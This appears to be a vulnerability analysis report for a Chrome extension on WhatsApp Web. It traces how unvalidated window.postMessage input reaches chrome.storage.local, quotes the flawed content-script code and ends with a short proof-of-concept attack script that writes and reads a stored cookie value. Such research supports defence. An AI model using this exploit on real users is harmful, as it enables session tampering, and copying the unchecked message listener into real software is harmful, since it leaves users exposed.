# CoCo Analysis: jcboalojlnfgngljdbjphbkobajklngn

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 4 flows including cs_window_eventListener_message → chrome_storage_local_set_sink and storage_local_get_source → window_postMessage_sink

---

## Sink 1: cs_window_eventListener_message → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/jcboalojlnfgngljdbjphbkobajklngn/opgen_generated_files/cs_0.js
Line 643: `mwapi.prototype.onMultiwebMsg = function (e) {`
Line 645: `window.mwapi.execute(e.data);`
Line 736: `if (e.data.type == "setLanguage") {`
Line 737: `chrome.storage.local.set({ "selectedLanguage": e.data.selectedLanguage }, function () {`

**Code:**

```javascript
// Content script - Entry point (cs_0.js line 634)
window.addEventListener('message', this.onMultiwebMsg);

// Message handler (cs_0.js line 643)
mwapi.prototype.onMultiwebMsg = function (e) {
  try {
    window.mwapi.execute(e.data); // ← attacker-controlled
  } catch (e) {
    console.log(e)
  }
}

// Execute function handles various message types (cs_0.js line 727)
mwapi.prototype.execute = async function (e) {
  try {
    if (e.type == "req_cookie") {

      // Language storage poisoning
      if (e.data.type == "setLanguage") {
        chrome.storage.local.set({ "selectedLanguage": e.data.selectedLanguage }, function () { // ← attacker-controlled
        });
        window.postMessage({ type: '_mw_language_', msg: e.data.selectedLanguage }, '*');
      }

      // Cookie storage poisoning
      if (e.data.type == "set") {
        chrome.storage.local.set({ "mwcookie": e.data.cookie }, function () { // ← attacker-controlled
        });
        window.postMessage({ type: '_mw_cookie_', msg: e.data.cookie }, '*');
      }
    }
  } catch (e) {
    console.log(e)
  }
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage

## Sink 2: storage_local_get_source → window_postMessage_sink (Complete Exploitation Chain)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/jcboalojlnfgngljdbjphbkobajklngn/opgen_generated_files/cs_0.js
Line 418: `var storage_local_get_source = { 'key': 'value' };`
Line 758: `if (items && items['selectedLanguage']) {`
Line 761: `window.postMessage({ type: '_mw_language_', msg: lang }, '*');`

Line 769: `if (items && items['mwcookie']) {`
Line 772: `window.postMessage({ type: '_mw_cookie_', msg: ck }, '*');`

**Code:**

```javascript
// Content script - Complete exploitation chain (cs_0.js)
mwapi.prototype.execute = async function (e) {
  try {
    if (e.type == "req_cookie") {

      // 1. Attacker poisons language storage
      if (e.data.type == "setLanguage") {
        chrome.storage.local.set({ "selectedLanguage": e.data.selectedLanguage }, function () { // ← attacker-controlled
        });
        window.postMessage({ type: '_mw_language_', msg: e.data.selectedLanguage }, '*');
      }

      // 2. Attacker triggers language storage read
      if (e.data.type == "getLanguage") {
        let userLang = navigator.language || navigator.userLanguage;
        const supportedLanguages = {
          "pt-BR": "pt_BR", "pt": "pt_BR", "es-ES": "es", "es": "es",
          "en-US": "en", "en-GB": "en", "en": "en"
        };
        let selectedLanguage = supportedLanguages[userLang] || "en";

        chrome.storage.local.get(["selectedLanguage"], function (items) {
          let lang = {selectedLanguage: selectedLanguage};
          if (items && items['selectedLanguage']) {
            lang = items['selectedLanguage']; // ← poisoned data
          }
          window.postMessage({ type: '_mw_language_', msg: lang }, '*'); // ← sent back to attacker
        });
      }

      // 3. Attacker poisons cookie storage
      if (e.data.type == "set") {
        chrome.storage.local.set({ "mwcookie": e.data.cookie }, function () { // ← attacker-controlled
        });
        window.postMessage({ type: '_mw_cookie_', msg: e.data.cookie }, '*');
      }

      // 4. Attacker triggers cookie storage read
      if (e.data.type == "get") {
        chrome.storage.local.get(["mwcookie"], function (items) {
          let ck = null;
          if (items && items['mwcookie']) {
            ck = items['mwcookie']; // ← poisoned data
          }
          window.postMessage({ type: '_mw_cookie_', msg: ck }, '*'); // ← sent back to attacker
        });
      }
    }
  } catch (e) {
    console.log(e)
  }
}
```

**Attack:**

```javascript
// On https://web.whatsapp.com/* (where content script runs)
// Attack 1: Language storage exploitation
// Step 1: Poison language storage
window.postMessage({
  type: "req_cookie",
  data: { type: "setLanguage", selectedLanguage: "attacker_payload" }
}, "*");

// Step 2: Trigger storage read to retrieve poisoned value
window.postMessage({
  type: "req_cookie",
  data: { type: "getLanguage" }
}, "*");

// Attack 2: Cookie storage exploitation
// Step 1: Poison cookie storage
window.postMessage({
  type: "req_cookie",
  data: { type: "set", cookie: "attacker_session_token" }
}, "*");

// Step 2: Trigger storage read to retrieve poisoned value
window.postMessage({
  type: "req_cookie",
  data: { type: "get" }
}, "*");

// Step 3: Listen for responses with poisoned data
window.addEventListener("message", function(event) {
  if (event.data.type === '_mw_language_') {
    console.log("Poisoned language:", event.data.msg);
  }
  if (event.data.type === '_mw_cookie_') {
    console.log("Poisoned cookie:", event.data.msg);
  }
});
```

**Impact:** Complete storage exploitation chain allowing attacker to poison and retrieve arbitrary data from chrome.storage.local. The extension accepts window.postMessage without origin validation and implements a full read/write API for storage manipulation. Attacker can poison authentication cookies (`mwcookie`) and language settings, then retrieve them back via the message passing interface. This affects the extension on WhatsApp Web (https://web.whatsapp.com/*) where the content script is injected, allowing any malicious code on that domain to exploit the vulnerability.
